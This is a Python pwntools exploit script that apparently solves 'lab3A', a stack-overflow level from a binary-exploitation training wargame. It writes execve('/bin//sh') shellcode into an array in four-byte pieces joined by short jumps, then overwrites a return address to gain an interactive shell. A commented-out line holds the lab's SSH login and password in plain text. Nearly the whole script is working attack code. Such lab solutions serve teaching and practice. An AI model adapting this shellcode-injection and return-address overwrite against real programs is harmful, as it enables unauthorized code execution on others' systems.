from pwn import *
import time

#s = ssh(host='192.168.203.146', port=22, user='lab3A', password='wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd')
#r = gdb.debug("./lab3A", "break *0x08048c3b")
#r = s.process("/levels/lab03/./lab3A")
r = process("./lab3A")

r.recv()


# Shellcode 30 bytes
shell_1 = 0x9050c031	# 6 bytes, shellcode = 6
shell_2 = 0x01e99090	# 2 bytes for JMP 1, nops because can't push stack
shell_3 = 0xcccccccc
shell_4 = 0x732f2f68	# 6 bytes, shellcode = 12
shell_5 = 0x01e99068	# 2 bytes for JMP 2
shell_6 = 0xcccccccc
shell_7 = 0x69622f68	# 6 byte, shellcode  = 18
shell_8 = 0x01e9906e	# 2 bytes for JMP 3
shell_9 = 0xcccccccc
shell_10 = 0xc189e389	# 6 bytes, shellcode = 24
shell_11 = 0x01e9c289	# 2 bytes for JMP 4
shell_12 = 0xcccccccc
shell_13 = 0x80cd0bb0	# 6 bytes, shellcode = 30

# EIP control
ret2shell = 0xffffd17c
num = 109


# Setup shellcode
r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_1))
r.recv()
r.sendline('1')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_2))
r.recv()
r.sendline('2')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_3))
r.recv()
r.sendline('3')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_4))
r.recv()
r.sendline('4')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_5))    
r.recv()
r.sendline('5')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_6))    
r.recv()
r.sendline('6')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_7))    
r.recv()
r.sendline('7')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_8))    
r.recv()
r.sendline('8')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_9))    
r.recv()
r.sendline('9')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_10))    
r.recv()
r.sendline('10')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_11))    
r.recv()
r.sendline('11')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_12))    
r.recv()
r.sendline('12')    # Index
r.recv()

r.sendline('store')     # Command
r.recv()
r.sendline(str(shell_13))    
r.recv()
r.sendline('13')    # Index
r.recv()

# EIP overwrite - ret2shell
r.sendline('store')     # Command
r.recv()
r.sendline(str(ret2shell))    # ret2shell
r.recv()
r.sendline('%d' % num)    # Index
r.recv()


r.sendline("quit")

r.interactive()


